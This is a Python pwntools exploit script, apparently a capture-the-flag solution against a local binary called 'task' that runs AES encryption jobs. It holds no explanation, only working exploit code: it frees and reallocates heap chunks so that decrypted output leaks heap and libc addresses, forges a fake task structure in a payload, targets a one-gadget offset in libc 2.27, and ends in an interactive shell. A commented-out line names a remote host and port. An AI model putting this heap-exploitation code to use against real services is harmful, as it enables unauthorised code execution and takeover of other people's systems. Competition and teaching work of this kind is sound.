from pwn import *
from Crypto.Cipher import AES
# context.log_level = 'debug'
libc = ELF("./libc-2.27.so")
# p=remote('111.186.63.201',10001)
def add(task_id,de,key,IV,size,data):
	p.sendline("1")
	p.sendlineafter("Task id :",str(task_id))
	p.sendlineafter("(2):",str(de))
	p.sendafter("Key :",key)
	p.sendafter("IV :",IV)
	p.sendlineafter("Size :",str(size))
	p.sendafter("Data :",data)
def delete(task_id):
	p.sendlineafter("Choice","2")
	p.sendlineafter("id :",str(task_id))
def go(task_id):
	p.sendline("3")
	p.sendlineafter("id :",str(task_id))
def mdecript(key,iv):
	p.recvuntil("Ciphertext: \n")
	data = p.recvline().strip()
	text =  ""
	while data:
		tmp = ("".join(data.split(" "))).decode("hex")
		# print tmp
		text += tmp
		data = p.recvline(timeout = 1).strip()
	mode = AES.MODE_CBC
	cryptos = AES.new(key, mode, iv)
	plain = cryptos.decrypt(text)
	print  plain
	return plain




p = process("./task")
print("a")
add(1,1,'1'*0x20,'2'*0x10,0x70,'a'*0x70)
add(2,1,'1'*0x20,'2'*0x10,0x70,'a'*0x70)
add(3,1,'1'*0x20,'2'*0x10,0x70,'a'*0x70)
print("b")
# ss = raw_input()
go(1)
delete(3)
delete(1)
delete(2)
add(2,1,'1'*0x20,'2'*0x10,0x10,'a'*0x10)
add(3,1,'1'*0x20,'2'*0x10,0x10,'a'*0x10)
print("b")
heap = u64(mdecript('1'*0x20,'2'*0x10)[:8])
log.success("heap = " + hex(heap))
add(4,1,'1'*0x20,'2'*0x10,0x410,'a'*0x410)
add(5,1,'1'*0x20,'2'*0x10,0x70,'a'*0x70)
# ss = raw_input()
print("b")
go(4)
delete(4)
delete(5)
add(5,1,'1'*0x20,'2'*0x10,0x510,'a'*0x510)
payload = p64(heap + 0x420) + p64(0x10) + p32(1)
payload += "1"*0x20 + "2"*0x10 + p32(0) + p64(0) * 2 
payload += p64(heap + 0x80) + p64(4) + p64(heap - 0x80)
add(4,1,'1'*0x20,'2'*0x10,0x70,payload)
libc.address = u64(mdecript('1'*0x20,'2'*0x10)[:8]) - 0x3ec090
log.success("libc address = " + hex(libc.address))
one_gadget = libc.address + 0x10a398
log.success("one gadget = " + hex(one_gadget))
add(9,1,'1' * 0x20,'2'*0x10,0x70,"a" * 0x70)
add(10,1,'1' * 0x20,'2'*0x10,0xa0,'a' * 0xa0)
print("a")
# ss = raw_input()
go(10)

delete(10)
delete(9)
payload = p64(heap + 0x1270) + p64(0) * 1 + p64(1)
payload = payload.ljust(0xa0,"\x00")
add(11,1,'1' * 0x20,'2'*0x10,0x30,"\x00" * 0x10 + "\x10" * 0x10 + p64(0xdeadbeef)*2)
add(10,1,'1' * 0x20,'2'*0x10,0xa0,payload)

# add(6,1,'1' * 0x20,'2'*0x10,)
p.interactive()
